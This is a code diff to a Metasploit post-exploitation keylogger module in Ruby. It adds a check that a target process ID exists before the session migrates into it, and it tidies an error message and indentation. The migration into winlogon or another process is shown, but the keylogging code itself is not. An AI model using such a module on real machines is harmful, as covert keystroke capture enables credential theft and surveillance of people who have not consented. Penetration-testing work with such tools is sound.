@@ -9,11 +9,13 @@ require 'msf/core'
 require 'rex'
 require 'msf/core/post/file'
 require 'msf/core/post/windows/priv'
+require 'msf/core/post/common'
 
 class Metasploit3 < Msf::Post
 
 	include Msf::Post::Windows::Priv
 	include Msf::Post::File
+	include Msf::Post::Common
 
 	def initialize(info={})
 		super( update_info( info,
@@ -61,10 +63,10 @@ class Metasploit3 < Msf::Post
 			when "winlogon"
 				process_migrate(datastore['CAPTURE_TYPE'],datastore['LOCKSCREEN'])
 			when "pid"
-				if datastore['PID']
+				if datastore['PID'] and has_pid?(datastore['PID'])
 					pid_migrate(datastore['PID'])
 				else
-					print_error("If capture type is pid you must provide one")
+					print_error("If capture type is pid you must provide a valid one")
 					return
 				end
 			end
@@ -124,8 +126,8 @@ class Metasploit3 < Msf::Post
 	# Method for migrating in to a PID
 	def pid_migrate(pid)
 		print_status("\tMigrating into #{pid}...")
-				session.core.migrate(pid)
-				print_status("Migration successful!")
+		session.core.migrate(pid)
+		print_status("Migration successful!")
 	end
 
 	# Method for starting the keylogger
